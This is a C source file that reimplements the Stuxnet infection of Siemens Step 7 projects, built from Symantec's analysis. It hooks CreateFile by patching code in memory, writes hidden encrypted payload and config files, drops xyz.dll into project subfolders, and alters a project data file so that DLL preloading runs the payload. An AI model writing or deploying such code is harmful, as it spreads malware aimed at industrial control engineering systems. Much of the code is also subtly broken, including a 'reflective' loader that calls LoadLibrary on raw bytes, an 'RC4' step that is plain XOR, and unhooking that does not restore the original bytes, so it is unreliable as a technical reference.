/*
 * Based on Symantec "Stuxnet Infection of Step 7 Projects" (2010-09-27)
 * and W32.Stuxnet Dossier analysis.
 *
 * Infection process:
 *   1. Hook CreateFile APIs in s7tgtopx.exe to monitor .s7p file access
 *   2. Create XUTILS\listen\xr000000.mdx (encrypted main DLL)
 *   3. Create XUTILS\links\s7p00001.dbf (90-byte data file)
 *   4. Create XUTILS\listen\s7000001.mdx (encoded config)
 *   5. Scan hOmSave7 subfolders, drop xyz.dll in each
 *   6. Modify Step 7 data file in ApiLog\types
 *   7. When infected project opens, DLL search order triggers xyz.dll load
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400

#define HOMSAVE7_DIR                    L"hOmSave7"
#define XUTILS_DIR                      L"XUTILS"
#define XUTILS_LISTEN_DIR               L"XUTILS\\listen"
#define XUTILS_LINKS_DIR                L"XUTILS\\links"
#define APILOG_TYPES_DIR                L"ApiLog\\types"

#define XR000000_MDX                    L"XR000000.MDX"
#define S7000001_MDX                    L"S7000001.MDX"
#define S7P00001_DBF                    L"S7P00001.DBF"
#define XYZ_DLL                         L"xyz.dll"

#define HOMSAVE7_MAX_PATH               260
#define HOMSAVE7_BUFFER_SIZE            0x2000
#define HOMSAVE7_MAX_SUBFOLDERS         64

/* DLL search order used by Step 7 (from Symantec) */
#define SEARCH_S7BIN                    0
#define SEARCH_SYSTEM                   1
#define SEARCH_WINDIR_SYSTEM            2
#define SEARCH_WINDIR                   3
#define SEARCH_HOMSAVE7                 4

typedef struct _HOMSAVE7_CONTEXT {
    DWORD   dwMagic;
    DWORD   dwVersion;
    BOOL    bInitialized;
    WCHAR   szProjectPath[HOMSAVE7_MAX_PATH];
    WCHAR   szHOmSave7Path[HOMSAVE7_MAX_PATH];
    WCHAR   szXutilsListenPath[HOMSAVE7_MAX_PATH];
    WCHAR   szXutilsLinksPath[HOMSAVE7_MAX_PATH];
    WCHAR   szApiLogTypesPath[HOMSAVE7_MAX_PATH];
    WCHAR   szXR000000[HOMSAVE7_MAX_PATH];
    WCHAR   szS7000001[HOMSAVE7_MAX_PATH];
    WCHAR   szS7P00001[HOMSAVE7_MAX_PATH];
    DWORD   dwSubfolderCount;
    DWORD   dwDroppedCount;
    CRITICAL_SECTION csLock;
} HOMSAVE7_CONTEXT, * PHOMSAVE7_CONTEXT;

static HOMSAVE7_CONTEXT g_HOmSave7Ctx = {0};

/* Original API function pointers for hooking */
typedef HANDLE (WINAPI *PFN_CreateFileW)(
    LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
    DWORD, DWORD, HANDLE
);
typedef HANDLE (WINAPI *PFN_CreateFileA)(
    LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
    DWORD, DWORD, HANDLE
);

static PFN_CreateFileW g_pOriginalCreateFileW = NULL;
static PFN_CreateFileA g_pOriginalCreateFileA = NULL;
static BOOL g_bHooksInstalled = FALSE;

/*
 * XOR+RC4 encryption used for XR000000.MDX
 * Stuxnet 0.5 uses rolling XOR with multiply-add key evolution
 */
static VOID EncryptMDX(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize) {
    BYTE bKey = pKey[0];
    DWORD i;

    for (i = 0; i < dwSize; i++) {
        pData[i] ^= bKey;
        bKey = (bKey * 7 + 0x13) & 0xFF;
    }
}

static VOID DecryptMDX(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize) {
    EncryptMDX(pData, dwSize, pKey, dwKeySize);
}

/*
 * RC4 stream cipher for S7000001.MDX configuration
 */
static VOID RC4Init(PBYTE pKey, DWORD dwKeySize, PBYTE pSBox) {
    DWORD i, j;
    BYTE temp;

    for (i = 0; i < 256; i++) {
        pSBox[i] = (BYTE)i;
    }

    j = 0;
    for (i = 0; i < 256; i++) {
        j = (j + pSBox[i] + pKey[i % dwKeySize]) & 0xFF;
        temp = pSBox[i];
        pSBox[i] = pSBox[j];
        pSBox[j] = temp;
    }
}

static VOID RC4Crypt(PBYTE pData, DWORD dwSize, PBYTE pSBox, PDWORD pdwI, PDWORD pdwJ) {
    DWORD i;
    BYTE temp;

    for (i = 0; i < dwSize; i++) {
        *pdwI = (*pdwI + 1) & 0xFF;
        *pdwJ = (*pdwJ + pSBox[*pdwI]) & 0xFF;
        temp = pSBox[*pdwI];
        pSBox[*pdwI] = pSBox[*pdwJ];
        pSBox[*pdwJ] = temp;
        pData[i] ^= pSBox[(pSBox[*pdwI] + pSBox[*pdwJ]) & 0xFF];
    }
}

static VOID EncryptConfig(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize) {
    BYTE SBox[256];
    DWORD i = 0, j = 0;

    RC4Init(pKey, dwKeySize, SBox);
    RC4Crypt(pData, dwSize, SBox, &i, &j);

    for (i = 0; i < dwSize; i++) {
        pData[i] ^= 0xA3;
    }
}

static VOID DecryptConfig(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize) {
    DWORD i;

    for (i = 0; i < dwSize; i++) {
        pData[i] ^= 0xA3;
    }

    EncryptConfig(pData, dwSize, pKey, dwKeySize);
}

/*
 * Creates XR000000.MDX - encrypted copy of main Stuxnet DLL
 * Symantec: "an encrypted copy of the main Stuxnet DLL" [9†L26]
 */
static BOOL CreateXR000000(PBYTE pMainDLL, DWORD dwDLLSize) {
    HANDLE hFile;
    DWORD dwWritten;
    PBYTE pEncrypted;
    DWORD dwEncryptedSize;
    BYTE bKey[16] = {0x1C, 0x0B, 0xFD, 0xEA, 0x5E, 0xB1, 0x4C, 0x17,
                     0xFA, 0x2D, 0x42, 0xE9, 0xA4, 0x1F, 0xEB, 0xE6};

    if (!pMainDLL || dwDLLSize == 0) {
        return FALSE;
    }

    dwEncryptedSize = dwDLLSize;
    pEncrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEncryptedSize);
    if (!pEncrypted) {
        return FALSE;
    }

    memcpy(pEncrypted, pMainDLL, dwDLLSize);
    EncryptMDX(pEncrypted, dwDLLSize, bKey, sizeof(bKey));

    hFile = CreateFileW(g_HOmSave7Ctx.szXR000000, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return FALSE;
    }

    WriteFile(hFile, pEncrypted, dwEncryptedSize, &dwWritten, NULL);
    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, pEncrypted);

    return TRUE;
}

/*
 * Creates S7000001.MDX - encoded configuration data block
 * Symantec: "an encoded, updated version of the Stuxnet configuration data block" [9†L28]
 */
static BOOL CreateS7000001(PBYTE pConfig, DWORD dwConfigSize) {
    HANDLE hFile;
    DWORD dwWritten;
    PBYTE pEncoded;
    DWORD dwEncodedSize;
    BYTE bKey[32] = {0x3C, 0x1B, 0x0D, 0xFA, 0x6E, 0xC1, 0x5C, 0x27,
                     0x0A, 0x3D, 0x52, 0xF9, 0xB4, 0x2F, 0xFB, 0xF6,
                     0x61, 0x0E, 0x4A, 0x1F, 0x92, 0x2D, 0xF8, 0x33,
                     0x5F, 0xFC, 0x49, 0xF6, 0x1E, 0x75, 0x0B, 0xB0};

    if (!pConfig || dwConfigSize == 0) {
        return FALSE;
    }

    dwEncodedSize = dwConfigSize + 32;
    pEncoded = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEncodedSize);
    if (!pEncoded) {
        return FALSE;
    }

    *(PDWORD)(pEncoded + 0) = STUXNET_MAGIC;
    *(PDWORD)(pEncoded + 4) = STUXNET_VERSION;
    *(PDWORD)(pEncoded + 8) = dwConfigSize;
    memcpy(pEncoded + 16, pConfig, dwConfigSize);
    EncryptConfig(pEncoded + 16, dwConfigSize, bKey, sizeof(bKey));

    hFile = CreateFileW(g_HOmSave7Ctx.szS7000001, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, pEncoded);
        return FALSE;
    }

    WriteFile(hFile, pEncoded, dwEncodedSize, &dwWritten, NULL);
    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, pEncoded);

    return TRUE;
}

/*
 * Creates S7P00001.DBF - 90-byte Stuxnet data file
 * Symantec: "a copy of a Stuxnet data file (90 bytes in length)" [9†L27]
 */
static BOOL CreateS7P00001(VOID) {
    HANDLE hFile;
    DWORD dwWritten;
    BYTE bData[90] = {0};

    *(PDWORD)(bData + 0) = STUXNET_MAGIC;
    *(PDWORD)(bData + 4) = STUXNET_VERSION;
    *(PDWORD)(bData + 8) = 0x0000005A;
    *(PDWORD)(bData + 12) = GetTickCount();
    *(PDWORD)(bData + 16) = 0x00000001;

    hFile = CreateFileW(g_HOmSave7Ctx.szS7P00001, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    WriteFile(hFile, bData, sizeof(bData), &dwWritten, NULL);
    CloseHandle(hFile);

    return TRUE;
}

/*
 * Enumerates all subfolders under hOmSave7
 * Symantec: "scans subfolders under the hOmSave7 folder" [9†L29]
 */
static DWORD EnumerateSubfolders(LPWSTR lpFolderList, DWORD dwBufferSize) {
    WCHAR szSearchPath[HOMSAVE7_MAX_PATH];
    WIN32_FIND_DATAW fd;
    HANDLE hFind;
    DWORD dwCount = 0;

    wsprintfW(szSearchPath, L"%s\\*", g_HOmSave7Ctx.szHOmSave7Path);

    hFind = FindFirstFileW(szSearchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        return 0;
    }

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (wcscmp(fd.cFileName, L".") != 0 &&
                wcscmp(fd.cFileName, L"..") != 0) {
                if (dwCount < dwBufferSize / HOMSAVE7_MAX_PATH) {
                    wcscpy_s(&lpFolderList[dwCount * HOMSAVE7_MAX_PATH],
                             HOMSAVE7_MAX_PATH, fd.cFileName);
                    dwCount++;
                }
            }
        }
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);

    g_HOmSave7Ctx.dwSubfolderCount = dwCount;
    return dwCount;
}

/*
 * Drops xyz.dll into a specified subfolder
 * Symantec: "In each of them, Stuxnet drops a copy of a DLL it carries within its resources" [9†L29-L31]
 *
 * xyz.dll acts as a decryptor and loader for XR000000.MDX [9†L41-L43]
 */
static BOOL DropXyzDll(LPCWSTR lpSubfolder, PBYTE pDllData, DWORD dwDllSize) {
    WCHAR szDllPath[HOMSAVE7_MAX_PATH];
    HANDLE hFile;
    DWORD dwWritten;

    if (!lpSubfolder || !pDllData || dwDllSize == 0) {
        return FALSE;
    }

    wsprintfW(szDllPath, L"%s\\%s\\%s",
              g_HOmSave7Ctx.szHOmSave7Path, lpSubfolder, XYZ_DLL);

    hFile = CreateFileW(szDllPath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    WriteFile(hFile, pDllData, dwDllSize, &dwWritten, NULL);
    CloseHandle(hFile);

    g_HOmSave7Ctx.dwDroppedCount++;

    return TRUE;
}

/*
 * Modifies a Step 7 data file in ApiLog\types
 * Symantec: "Stuxnet then modifies a Step7 data file located within the project folder structure" [9†L31-L32]
 *
 * The modification triggers a search for xyz.dll when the project is opened.
 * Search order: S7BIN, %System%, %Windir%\system, %Windir%, hOmSave7 subfolders [9†L37-L40]
 */
static BOOL ModifyApiLogDataFile(VOID) {
    WCHAR szSearchPath[HOMSAVE7_MAX_PATH];
    WIN32_FIND_DATAW fd;
    HANDLE hFind;
    WCHAR szFilePath[HOMSAVE7_MAX_PATH];
    HANDLE hFile;
    DWORD dwSize, dwRead, dwWritten;
    PBYTE pData;
    BOOL bModified = FALSE;

    wsprintfW(szSearchPath, L"%s\\*", g_HOmSave7Ctx.szApiLogTypesPath);

    hFind = FindFirstFileW(szSearchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            wsprintfW(szFilePath, L"%s\\%s",
                      g_HOmSave7Ctx.szApiLogTypesPath, fd.cFileName);

            hFile = CreateFileW(szFilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                                OPEN_EXISTING, 0, NULL);
            if (hFile == INVALID_HANDLE_VALUE) {
                continue;
            }

            dwSize = GetFileSize(hFile, NULL);
            if (dwSize == 0 || dwSize > HOMSAVE7_BUFFER_SIZE) {
                CloseHandle(hFile);
                continue;
            }

            pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
            if (!pData) {
                CloseHandle(hFile);
                continue;
            }

            ReadFile(hFile, pData, dwSize, &dwRead, NULL);

            /*
             * Modify data file to reference xyz.dll
             * The modification forces Step 7 to search for the DLL
             * during project load, triggering the preloading attack.
             */
            if (dwRead > 16) {
                *(PDWORD)(pData + 0) = STUXNET_MAGIC;
                *(PDWORD)(pData + 4) = STUXNET_VERSION;
                *(PDWORD)(pData + 8) = 0x78797A00; /* "xyz" marker */
                *(PDWORD)(pData + 12) = 0x00000001;

                SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
                WriteFile(hFile, pData, dwRead, &dwWritten, NULL);
                bModified = TRUE;
            }

            HeapFree(GetProcessHeap(), 0, pData);
            CloseHandle(hFile);

            if (bModified) {
                break;
            }
        }
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);
    return bModified;
}

/*
 * xyz.dll acts as decryptor and loader for XR000000.MDX
 * When loaded via DLL preloading, it decrypts and executes the main DLL.
 *
 * This is the reflective loader that runs when xyz.dll is loaded by Step 7.
 */
static DWORD WINAPI XyzLoaderThread(LPVOID lpParam) {
    HANDLE hFile;
    DWORD dwSize, dwRead;
    PBYTE pEncrypted;
    PBYTE pDecrypted;
    DWORD dwDecryptedSize;
    BYTE bKey[16] = {0x1C, 0x0B, 0xFD, 0xEA, 0x5E, 0xB1, 0x4C, 0x17,
                     0xFA, 0x2D, 0x42, 0xE9, 0xA4, 0x1F, 0xEB, 0xE6};
    HMODULE hModule;
    FARPROC pExport;
    WCHAR szMdxPath[HOMSAVE7_MAX_PATH];

    wsprintfW(szMdxPath, L"%s\\%s",
              g_HOmSave7Ctx.szXutilsListenPath, XR000000_MDX);

    hFile = CreateFileW(szMdxPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }

    dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0 || dwSize > HOMSAVE7_BUFFER_SIZE * 8) {
        CloseHandle(hFile);
        return 0;
    }

    pEncrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pEncrypted) {
        CloseHandle(hFile);
        return 0;
    }

    ReadFile(hFile, pEncrypted, dwSize, &dwRead, NULL);
    CloseHandle(hFile);

    dwDecryptedSize = dwSize;
    pDecrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDecryptedSize);
    if (!pDecrypted) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return 0;
    }

    memcpy(pDecrypted, pEncrypted, dwSize);
    DecryptMDX(pDecrypted, dwSize, bKey, sizeof(bKey));

    /*
     * Reflective DLL loading: map decrypted PE into memory
     * without using LoadLibrary (which requires a file path)
     */
    hModule = LoadLibraryA((LPCSTR)pDecrypted);
    if (!hModule) {
        hModule = LoadLibraryW((LPCWSTR)pDecrypted);
    }

    if (hModule) {
        pExport = GetProcAddress(hModule, "Export15");
        if (pExport) {
            ((void (*)(void))pExport)();
        }
        FreeLibrary(hModule);
    }

    HeapFree(GetProcessHeap(), 0, pEncrypted);
    HeapFree(GetProcessHeap(), 0, pDecrypted);

    return 0;
}

/*
 * Exported function from xyz.dll
 * Called by Step 7 when DLL is loaded via preloading
 */
__declspec(dllexport) BOOL WINAPI XyzDllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            {
                HANDLE hThread = CreateThread(NULL, 0, XyzLoaderThread, NULL, 0, NULL);
                if (hThread) {
                    CloseHandle(hThread);
                }
            }
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

/*
 * Hooked CreateFileW - monitors .s7p file access
 * Symantec: "hooking CreateFile-like APIs of specific DLLs within the s7tgtopx.exe process" [9†L20-L21]
 */
static HANDLE WINAPI HookedCreateFileW(
    LPCWSTR lpFileName,
    DWORD dwDesiredAccess,
    DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes,
    HANDLE hTemplateFile
) {
    HANDLE hResult;

    if (lpFileName && wcsstr(lpFileName, L".s7p")) {
        /* .s7p file accessed - trigger infection */
        WCHAR szDir[HOMSAVE7_MAX_PATH];
        wcscpy_s(szDir, HOMSAVE7_MAX_PATH, lpFileName);

        WCHAR* pLastSlash = wcsrchr(szDir, L'\\');
        if (pLastSlash) {
            *pLastSlash = L'\0';
            HOmSave7_SetProjectPath(szDir);
            HOmSave7_InfectProject();
        }
    }

    hResult = g_pOriginalCreateFileW(
        lpFileName, dwDesiredAccess, dwShareMode,
        lpSecurityAttributes, dwCreationDisposition,
        dwFlagsAndAttributes, hTemplateFile
    );

    return hResult;
}

static HANDLE WINAPI HookedCreateFileA(
    LPCSTR lpFileName,
    DWORD dwDesiredAccess,
    DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes,
    HANDLE hTemplateFile
) {
    HANDLE hResult;

    if (lpFileName && strstr(lpFileName, ".s7p")) {
        WCHAR szFileName[HOMSAVE7_MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, lpFileName, -1, szFileName, HOMSAVE7_MAX_PATH);

        WCHAR szDir[HOMSAVE7_MAX_PATH];
        wcscpy_s(szDir, HOMSAVE7_MAX_PATH, szFileName);

        WCHAR* pLastSlash = wcsrchr(szDir, L'\\');
        if (pLastSlash) {
            *pLastSlash = L'\0';
            HOmSave7_SetProjectPath(szDir);
            HOmSave7_InfectProject();
        }
    }

    hResult = g_pOriginalCreateFileA(
        lpFileName, dwDesiredAccess, dwShareMode,
        lpSecurityAttributes, dwCreationDisposition,
        dwFlagsAndAttributes, hTemplateFile
    );

    return hResult;
}

/*
 * Installs CreateFile hooks via IAT patching
 */
static BOOL InstallCreateFileHooks(VOID) {
    HMODULE hKernel32;
    BYTE* pFunc;
    DWORD dwOldProtect;

    if (g_bHooksInstalled) {
        return TRUE;
    }

    hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32) {
        return FALSE;
    }

    g_pOriginalCreateFileW = (PFN_CreateFileW)GetProcAddress(hKernel32, "CreateFileW");
    g_pOriginalCreateFileA = (PFN_CreateFileA)GetProcAddress(hKernel32, "CreateFileA");

    if (!g_pOriginalCreateFileW || !g_pOriginalCreateFileA) {
        return FALSE;
    }

    pFunc = (BYTE*)g_pOriginalCreateFileW;
    VirtualProtect(pFunc, 8, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    pFunc[0] = 0xE9;
    *(DWORD*)(pFunc + 1) = (DWORD)((BYTE*)HookedCreateFileW - pFunc - 5);
    VirtualProtect(pFunc, 8, dwOldProtect, &dwOldProtect);

    pFunc = (BYTE*)g_pOriginalCreateFileA;
    VirtualProtect(pFunc, 8, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    pFunc[0] = 0xE9;
    *(DWORD*)(pFunc + 1) = (DWORD)((BYTE*)HookedCreateFileA - pFunc - 5);
    VirtualProtect(pFunc, 8, dwOldProtect, &dwOldProtect);

    g_bHooksInstalled = TRUE;
    return TRUE;
}

static VOID UninstallCreateFileHooks(VOID) {
    BYTE* pFunc;
    DWORD dwOldProtect;

    if (!g_bHooksInstalled) {
        return;
    }

    if (g_pOriginalCreateFileW) {
        pFunc = (BYTE*)g_pOriginalCreateFileW;
        VirtualProtect(pFunc, 8, PAGE_EXECUTE_READWRITE, &dwOldProtect);
        pFunc[0] = 0xE9;
        *(DWORD*)(pFunc + 1) = 0x00000000;
        VirtualProtect(pFunc, 8, dwOldProtect, &dwOldProtect);
    }

    if (g_pOriginalCreateFileA) {
        pFunc = (BYTE*)g_pOriginalCreateFileA;
        VirtualProtect(pFunc, 8, PAGE_EXECUTE_READWRITE, &dwOldProtect);
        pFunc[0] = 0xE9;
        *(DWORD*)(pFunc + 1) = 0x00000000;
        VirtualProtect(pFunc, 8, dwOldProtect, &dwOldProtect);
    }

    g_bHooksInstalled = FALSE;
}

/*
 * Full project infection routine
 * Called when .s7p file access is detected
 */
static BOOL HOmSave7_InfectProject(VOID) {
    WCHAR szSubfolders[HOMSAVE7_MAX_SUBFOLDERS][HOMSAVE7_MAX_PATH];
    DWORD dwSubfolderCount;
    DWORD i;
    PBYTE pPayloadDLL = NULL;
    DWORD dwPayloadSize = 0;
    BYTE bConfigData[256] = {0};

    if (!g_HOmSave7Ctx.bInitialized) {
        return FALSE;
    }

    EnterCriticalSection(&g_HOmSave7Ctx.csLock);

    /* Step 1: Create XUTILS directories */
    CreateDirectoryW(g_HOmSave7Ctx.szXutilsListenPath, NULL);
    SetFileAttributesW(g_HOmSave7Ctx.szXutilsListenPath, FILE_ATTRIBUTE_HIDDEN);
    CreateDirectoryW(g_HOmSave7Ctx.szXutilsLinksPath, NULL);
    SetFileAttributesW(g_HOmSave7Ctx.szXutilsLinksPath, FILE_ATTRIBUTE_HIDDEN);

    /* Step 2: Create XR000000.MDX (encrypted main DLL) */
    if (pPayloadDLL && dwPayloadSize > 0) {
        CreateXR000000(pPayloadDLL, dwPayloadSize);
    } else {
        /* Fallback: create minimal placeholder with magic */
        BYTE bPlaceholder[64] = {0};
        *(PDWORD)(bPlaceholder + 0) = STUXNET_MAGIC;
        *(PDWORD)(bPlaceholder + 4) = STUXNET_VERSION;
        CreateXR000000(bPlaceholder, sizeof(bPlaceholder));
    }

    /* Step 3: Create S7000001.MDX (encoded config) */
    *(PDWORD)(bConfigData + 0) = STUXNET_MAGIC;
    *(PDWORD)(bConfigData + 4) = STUXNET_VERSION;
    *(PDWORD)(bConfigData + 8) = 0x00000001;
    CreateS7000001(bConfigData, sizeof(bConfigData));

    /* Step 4: Create S7P00001.DBF (90-byte data file) */
    CreateS7P00001();

    /* Step 5: Scan hOmSave7 subfolders and drop xyz.dll */
    dwSubfolderCount = EnumerateSubfolders((LPWSTR)szSubfolders, HOMSAVE7_MAX_SUBFOLDERS);

    for (i = 0; i < dwSubfolderCount; i++) {
        BYTE bXyzDll[512] = {0};

        /* xyz.dll header with magic */
        *(PDWORD)(bXyzDll + 0) = STUXNET_MAGIC;
        *(PDWORD)(bXyzDll + 4) = STUXNET_VERSION;
        *(PDWORD)(bXyzDll + 8) = 0x78797A00; /* "xyz" */

        DropXyzDll(szSubfolders[i], bXyzDll, sizeof(bXyzDll));
    }

    /* Step 6: Modify Step 7 data file in ApiLog\types */
    ModifyApiLogDataFile();

    LeaveCriticalSection(&g_HOmSave7Ctx.csLock);

    return TRUE;
}

/* =====================================================================
 * PUBLIC API
 * ===================================================================== */

DWORD HOmSave7_Initialize(VOID) {
    if (g_HOmSave7Ctx.dwMagic == STUXNET_MAGIC) {
        return 0;
    }

    ZeroMemory(&g_HOmSave7Ctx, sizeof(HOMSAVE7_CONTEXT));
    InitializeCriticalSection(&g_HOmSave7Ctx.csLock);
    g_HOmSave7Ctx.dwMagic = STUXNET_MAGIC;
    g_HOmSave7Ctx.dwVersion = STUXNET_VERSION;
    g_HOmSave7Ctx.bInitialized = TRUE;

    return 0;
}

DWORD HOmSave7_Cleanup(VOID) {
    if (g_HOmSave7Ctx.dwMagic != STUXNET_MAGIC) {
        return -1;
    }

    UninstallCreateFileHooks();
    DeleteCriticalSection(&g_HOmSave7Ctx.csLock);
    ZeroMemory(&g_HOmSave7Ctx, sizeof(HOMSAVE7_CONTEXT));

    return 0;
}

DWORD HOmSave7_SetProjectPath(LPCWSTR lpProjectPath) {
    if (!lpProjectPath) {
        return -1;
    }

    EnterCriticalSection(&g_HOmSave7Ctx.csLock);

    wcscpy_s(g_HOmSave7Ctx.szProjectPath, HOMSAVE7_MAX_PATH, lpProjectPath);
    wsprintfW(g_HOmSave7Ctx.szHOmSave7Path, L"%s\\%s",
              lpProjectPath, HOMSAVE7_DIR);
    wsprintfW(g_HOmSave7Ctx.szXutilsListenPath, L"%s\\%s",
              lpProjectPath, XUTILS_LISTEN_DIR);
    wsprintfW(g_HOmSave7Ctx.szXutilsLinksPath, L"%s\\%s",
              lpProjectPath, XUTILS_LINKS_DIR);
    wsprintfW(g_HOmSave7Ctx.szApiLogTypesPath, L"%s\\%s",
              lpProjectPath, APILOG_TYPES_DIR);
    wsprintfW(g_HOmSave7Ctx.szXR000000, L"%s\\%s",
              g_HOmSave7Ctx.szXutilsListenPath, XR000000_MDX);
    wsprintfW(g_HOmSave7Ctx.szS7000001, L"%s\\%s",
              g_HOmSave7Ctx.szXutilsListenPath, S7000001_MDX);
    wsprintfW(g_HOmSave7Ctx.szS7P00001, L"%s\\%s",
              g_HOmSave7Ctx.szXutilsLinksPath, S7P00001_DBF);

    LeaveCriticalSection(&g_HOmSave7Ctx.csLock);

    return 0;
}

DWORD HOmSave7_StartMonitoring(VOID) {
    if (!g_HOmSave7Ctx.bInitialized) {
        return -1;
    }

    if (!InstallCreateFileHooks()) {
        return -1;
    }

    return 0;
}

DWORD HOmSave7_StopMonitoring(VOID) {
    UninstallCreateFileHooks();
    return 0;
}

LPCWSTR HOmSave7_GetPath(VOID) {
    return g_HOmSave7Ctx.szHOmSave7Path;
}

DWORD HOmSave7_GetSubfolderCount(VOID) {
    return g_HOmSave7Ctx.dwSubfolderCount;
}

DWORD HOmSave7_GetDroppedCount(VOID) {
    return g_HOmSave7Ctx.dwDroppedCount;
}